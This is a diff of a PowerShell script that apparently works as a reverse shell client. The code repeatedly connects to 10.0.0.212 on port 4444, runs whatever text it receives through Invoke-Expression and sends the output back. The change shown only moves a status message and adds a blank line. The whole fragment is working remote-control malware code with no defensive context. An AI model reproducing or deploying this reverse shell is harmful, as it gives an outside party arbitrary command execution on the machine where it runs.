@@ -18,14 +18,13 @@ function title {
 function run() {
     title
     while ($true) {
+
         try {
             $server = "10.0.0.212"
             $client = New-Object System.Net.Sockets.TCPClient($server, 4444)
             $stream = $client.GetStream() 
             [byte[]]$bytes = 0..65535 | ForEach-Object { 0 }; 
             
-            Write-Host "Connection established...:)" -ForegroundColor Green
-
             while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
                 $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
                 $sendback = (Invoke-Expression $data 2>&1);
@@ -38,6 +37,7 @@ function run() {
         catch {
             Write-Host "Could not establish connection..." -ForegroundColor Red
         }
+        Write-Host "Connection established...:)" -ForegroundColor Green
     }
 }
 
